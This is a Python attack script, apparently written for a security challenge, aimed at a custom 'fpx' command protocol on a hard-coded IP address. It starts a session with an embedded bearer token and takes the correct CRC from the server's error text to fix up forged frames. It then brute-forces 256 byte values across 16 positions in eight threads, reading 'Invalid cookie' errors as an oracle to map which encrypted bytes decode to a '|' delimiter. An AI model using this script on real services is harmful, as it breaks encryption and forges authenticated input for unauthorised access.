import http.client, json, time, threading, queue

TOKEN = "f74d75fda936985ad63d0960aa1dab94"
AUTH = {"Authorization": "Bearer " + TOKEN, "Content-Type": "application/json"}

def new_conn():
    return http.client.HTTPConnection("1.14.76.59", 29590, timeout=15)

def req(conn, path, obj):
    for _ in range(3):
        try:
            conn.request("POST", path, body=json.dumps(obj).encode(), headers=AUTH)
            r = conn.getresponse(); b = r.read(20000)
            return r.status, b.decode("utf-8", "replace")
        except Exception:
            try: conn.close()
            except Exception: pass
            conn = new_conn()
            time.sleep(0.1)
    return None, ""

conn = new_conn()
st, b = req(conn, "/api/v1/fpx/handshake", {})
sess = json.loads(b)["session_id"]
print("session", sess, flush=True)

def send(cmd, payload, conn):
    body = bytes([0xFB, 0xAE, cmd, (len(payload) >> 8) & 0xFF, len(payload) & 0xFF]) + payload
    st, b = req(conn, "/api/v1/fpx/command", {"session_id": sess, "frame": body.hex().upper() + "0000"})
    if b and "CRC mismatch" in b:
        exp = json.loads(b)["error"].split("expected ")[1].split(",")[0].strip()
        st, b = req(conn, "/api/v1/fpx/command", {"session_id": sess, "frame": body.hex().upper() + "%04X" % int(exp, 16)})
    return b

NPOS = 16
results = {}
lock = threading.Lock()
q = queue.Queue()
for i in range(NPOS):
    for v in range(256):
        q.put((i, v))

def worker():
    c = new_conn()
    while True:
        try: i, v = q.get_nowait()
        except queue.Empty: return
        payload = bytearray(i + 1)
        payload[i] = v
        b = send(0x04, bytes(payload), c)
        if b and "Invalid cookie" in b:
            with lock:
                print(f"  pos={i} byte=0x{v:02X} -> PIPE", flush=True)
                results[i] = v

ts = [threading.Thread(target=worker) for _ in range(8)]
for t in ts: t.start()
for t in ts: t.join()

print("=== pairs (pos, enc_byte giving '|')", flush=True)
for i in range(NPOS):
    print(i, hex(results.get(i, -1)), flush=True)
json.dump({str(k): v for k, v in results.items()}, open("fpx_pipe_map.json", "w"))
